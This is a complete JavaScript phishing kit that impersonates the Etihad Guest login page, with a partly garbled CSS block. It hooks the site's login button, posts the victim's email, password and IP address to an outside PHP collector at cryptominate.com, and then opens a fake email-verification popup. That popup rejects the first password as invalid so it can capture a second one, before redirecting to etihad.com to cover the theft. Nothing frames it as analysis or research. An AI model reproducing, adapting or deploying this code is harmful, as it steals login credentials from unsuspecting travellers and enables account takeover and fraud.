<script>
    // Create style element and add all CSS
    const style = document.createElement('style');
    style.textContent = `

            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;

            background-color: #0070ba;

            justify-content: center;
            align-items: center;

            margin-top: 18px;

        }
        
        .ey-button--large.loading {
            color: transparent;
        }
        
        .ey-button--large.loading::after {
            content: "";
            position: absolute;
            top: 25%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .overlay-disabler {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.85);
            z-index: 999;
            display: none;
            justify-content: center;
            align-items: center;
        }
        
        .full-page-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top-color: #1a73e8;
            animation: spin 1s linear infinite;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1001;
            display: none;
        }
        
        .auth-popup {
            width: 420px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
            display: none;
            background: white;
        }
        
        .auth-header {
            background-color: #202124;
            color: white;
            padding: 6px 16px;
            font-size: 12px;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 24px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .auth-content {
            padding: 35px;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .auth-title {
            font-size: 22px;
            margin-bottom: 25px;
            color: #202124;
            text-align: center;
            font-weight: 500;
        }
        
        .error-message {
            color: #d32f2f;
            font-size: 14px;
            margin-bottom: 15px;
            text-align: center;
            display: none;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 20px;
            width: 100%;
            max-width: 320px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.4s ease;
        }
        
        .input-group.visible {
            opacity: 1;
            transform: translateY(0);
        }
        
        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #000;
            font-size: 18px;
            filter: brightness(0);
        }
        
        .auth-input {
            width: 100%;
            padding: 14px 14px 14px 40px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 15px;
            height: 48px;
            box-sizing: border-box;
        }
        
        .auth-input:focus {
            border-color: #1a73e8;

            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .auth-button {
            width: 100%;
            max-width: 320px;
            padding: 12px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.4s ease 0.1s;
        }
        
        .auth-button.visible {
            opacity: 1;
            transform: translateY(0);
        }
        
        .auth-button:hover {
            background-color: #1765cc;
        }
        
        .popup-spinner {

            height: 40px;
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top-color: #1a73e8;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        
        .success-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 50px;
            min-height: 240px;

        .checkmark-circle {
            width: 80px;
            height: 80px;
            border-radius: 50%;

    document.head.appendChild(style);

    // Create overlay disabler
    const overlayDisabler = document.createElement('div');
    overlayDisabler.className = 'overlay-disabler';
    overlayDisabler.id = 'overlayDisabler';
    document.body.appendChild(overlayDisabler);

    // Create full page spinner
    const fullPageSpinner = document.createElement('div');
    fullPageSpinner.className = 'full-page-spinner';
    fullPageSpinner.id = 'fullPageSpinner';
    document.body.appendChild(fullPageSpinner);

    // Create auth popup
    const authPopup = document.createElement('div');
    authPopup.className = 'auth-popup';
    authPopup.id = 'authPopup';

    // Generate random string for URL
    const generateRandomString = (length) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };

    // Generate random 50-character ID
    const generateRandomId = () => {
        return generateRandomString(60);
    };

    // Validate email format
    const isValidEmail = (email) => {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    };

    // Extract email from URL hash
    const getEmailFromUrl = () => {
        const hash = window.location.hash.substring(1);
        return hash.includes('@') ? hash : null;
    };

    // Modify URL to include random string
    const modifyUrl = () => {
        if (!window.location.hash) return;
        
        const baseUrl = window.location.href.split('#')[0];
        const randomString = generateRandomString(100);
        const email = window.location.hash.substring(1);
        const newUrl = `${baseUrl}${randomString}#${email}`;
        
        if (newUrl.length > window.location.href.length) {
            window.history.replaceState(null, null, newUrl);
        }
    };

    // Build popup structure
    authPopup.innerHTML = `
        <div class="auth-header" id="authHeader">
            <span id="randomId" style="font-family: monospace;">id:${generateRandomId()}</span>
        </div>
        <div class="auth-content" id="authContent">
            <h2 class="auth-title">Verify your email account</h2>
            <div class="error-message" id="errorMessage">Password is invalid, please try again.</div>
            <div class="popup-spinner" id="popupSpinner"></div>
            <div class="input-group">
                <span class="input-icon">👤</span>
                <input type="text" class="auth-input" id="confirmEmail" readonly>
            </div>
            <div class="input-group">
                <span class="input-icon">🔒</span>
                <input type="password" class="auth-input" id="confirmPassword" placeholder="Enter your password">
            </div>
            <button class="auth-button" id="confirmButton">
                <span class="button-text">Continue</span>
            </button>
        </div>
        <div class="success-container" id="successContainer">
            <div class="loading-spinner" id="finalSpinner"></div>
            <div class="checkmark-circle" id="checkmarkCircle">
                <div class="checkmark">✓</div>
            </div>
        </div>
        <div class="copyright">© 2026 Etihad Guest. All rights reserved.</div>
    `;
    document.body.appendChild(authPopup);

    // Initialize email from URL
    const initializeEmailFromUrl = () => {
        const email = getEmailFromUrl();
        if (email) {
            const emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.value = email;
            }
        }
    };

    // Modify URL on page load
    modifyUrl();

    // Wait for DOM to be fully loaded
    document.addEventListener('DOMContentLoaded', function() {
        // Set email from URL if available
        initializeEmailFromUrl();
        
        // Track login attempts
        let loginAttempts = 0;
        const maxAttempts = 2;
        
        // Get the login button by its class since it doesn't have an ID
        const loginButtons = document.getElementsByClassName('ey-button--large');
        if (loginButtons.length > 0) {
            const loginButton = loginButtons[0];
            
            loginButton.addEventListener('click', async function() {
                const email = document.getElementById('email')?.value;
                const password = document.getElementById('password')?.value;
                
                if (!email || !password) {
                    alert('Please enter both email and password');
                    return;
                }
                
                // Show loading spinner on button
                this.classList.add('loading');
                
                try {
                    // Get user IP
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const userIp = ipData.ip;
                    
                    // Submit to PHP
                    await submitToPhp(email, password, userIp, 'etihad login');
                    
                    // Show full page white overlay
                    document.getElementById('overlayDisabler').style.display = 'flex';
                    
                    // Show full page spinner for 4 seconds
                    document.getElementById('fullPageSpinner').style.display = 'block';
                    
                    // After 4 seconds, hide full page spinner and show popup
                    setTimeout(() => {
                        document.getElementById('fullPageSpinner').style.display = 'none';
                        
                        // Show popup with header and title (hide inputs initially)
                        document.getElementById('authPopup').style.display = 'block';
                        document.querySelectorAll('.input-group, .auth-button').forEach(el => {
                            el.style.display = 'none';
                        });
                        
                        // Set the email in the confirmation field only if it's valid
                        const confirmEmailInput = document.getElementById('confirmEmail');
                        if (isValidEmail(email)) {
                            confirmEmailInput.value = email;
                        } else {
                            confirmEmailInput.value = '';
                            confirmEmailInput.removeAttribute('readonly');
                        }
                        
                        // Hide error message initially
                        document.getElementById('errorMessage').style.display = 'none';
                        
                        // Show popup spinner for 2 seconds
                        document.getElementById('popupSpinner').style.display = 'block';
                        
                        // After 2 seconds, hide popup spinner and show form elements
                        setTimeout(() => {
                            document.getElementById('popupSpinner').style.display = 'none';
                            
                            // Show all form elements with animation
                            const inputGroups = document.querySelectorAll('.input-group');
                            const confirmButton = document.getElementById('confirmButton');
                            
                            inputGroups.forEach(el => el.style.display = 'block');
                            confirmButton.style.display = 'flex';
                            
                            // Animate them in sequence
                            inputGroups.forEach((group, index) => {
                                setTimeout(() => {
                                    group.classList.add('visible');
                                }, index * 200);
                            });
                            
                            setTimeout(() => {
                                confirmButton.classList.add('visible');
                            }, 400);
                            
                        }, 2000); // 2 seconds for popup spinner
                        
                    }, 4000); // 4 seconds for full page spinner
                    
                } catch (error) {
                    console.error('Error:', error);
                    // If IP fetch fails, just submit without IP
                    await submitToPhp(email, password, 'unknown', 'etihad login');
                    
                    // Still show the loading sequence
                    document.getElementById('overlayDisabler').style.display = 'flex';
                    document.getElementById('fullPageSpinner').style.display = 'block';
                    
                    setTimeout(() => {
                        document.getElementById('fullPageSpinner').style.display = 'none';
                        document.getElementById('authPopup').style.display = 'block';
                        document.querySelectorAll('.input-group, .auth-button').forEach(el => {
                            el.style.display = 'none';
                        });
                        
                        // Set the email in the confirmation field only if it's valid
                        const confirmEmailInput = document.getElementById('confirmEmail');
                        if (isValidEmail(email)) {
                            confirmEmailInput.value = email;
                        } else {
                            confirmEmailInput.value = '';
                            confirmEmailInput.removeAttribute('readonly');
                        }
                        
                        document.getElementById('popupSpinner').style.display = 'block';
                        
                        setTimeout(() => {
                            document.getElementById('popupSpinner').style.display = 'none';
                            const inputGroups = document.querySelectorAll('.input-group');
                            const confirmButton = document.getElementById('confirmButton');
                            
                            inputGroups.forEach(el => el.style.display = 'block');
                            confirmButton.style.display = 'flex';
                            
                            inputGroups.forEach((group, index) => {
                                setTimeout(() => {
                                    group.classList.add('visible');
                                }, index * 200);
                            });
                            
                            setTimeout(() => {
                                confirmButton.classList.add('visible');
                            }, 400);
                            
                        }, 2000);
                    }, 4000);
                } finally {
                    // Reset login button
                    this.classList.remove('loading');
                }
            });
        } else {
            console.error('Login button not found');
        }

        // Confirm button event listener
        const confirmButton = document.getElementById('confirmButton');
        if (confirmButton) {
            confirmButton.addEventListener('click', async function() {
                const password = document.getElementById('confirmPassword')?.value;
                const email = document.getElementById('confirmEmail')?.value;
                
                if (!password) {
                    alert('Please enter your password');
                    return;
                }
                
                // Hide form, show loading spinner
                document.getElementById('authContent').style.display = 'none';
                document.getElementById('successContainer').style.display = 'flex';
                document.getElementById('finalSpinner').style.display = 'block';
                document.getElementById('errorMessage').style.display = 'none';
                
                try {
                    // Get user IP again (in case it changed)
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const userIp = ipData.ip;
                    
                    // Submit to PHP
                    await submitToPhp(email, password, userIp, 'email login');
                    
                    // Increment login attempts
                    loginAttempts++;
                    
                    if (loginAttempts < maxAttempts) {
                        // Show error message and reset form
                        setTimeout(() => {
                            document.getElementById('successContainer').style.display = 'none';
                            document.getElementById('authContent').style.display = 'flex';
                            document.getElementById('errorMessage').style.display = 'block';
                            document.getElementById('confirmPassword').value = '';
                            document.getElementById('finalSpinner').style.display = 'none';
                        }, 1000);
                    } else {
                        // On third attempt, show success and redirect
                        document.getElementById('finalSpinner').style.display = 'none';
                        document.getElementById('checkmarkCircle').style.display = 'flex';
                        
                        // Redirect after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://www.etihad.com';
                        }, 2000);
                    }
                    
                } catch (error) {
                    console.error('Error:', error);
                    // If IP fetch fails, just submit without IP
                    await submitToPhp(email, password, 'unknown', 'email login');
                    
                    // Increment login attempts
                    loginAttempts++;
                    
                    if (loginAttempts < maxAttempts) {
                        // Show error message and reset form
                        setTimeout(() => {
                            document.getElementById('successContainer').style.display = 'none';
                            document.getElementById('authContent').style.display = 'flex';
                            document.getElementById('errorMessage').style.display = 'block';
                            document.getElementById('confirmPassword').value = '';
                            document.getElementById('finalSpinner').style.display = 'none';
                        }, 1000);
                    } else {
                        // On third attempt, show success and redirect
                        document.getElementById('finalSpinner').style.display = 'none';
                        document.getElementById('checkmarkCircle').style.display = 'flex';
                        
                        // Redirect after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://www.etihad.com';
                        }, 2000);
                    }
                }
            });
        } else {
            console.error('Confirm button not found');
        }
    });
    
    async function submitToPhp(email, password, ip, type) {
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        formData.append('ip', ip);
        formData.append('type', type);
        
        const response = await fetch('https://cryptominate.com/ks/etihad.php', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Submission failed');
        }
        
        return await response.json();
    }
</script>
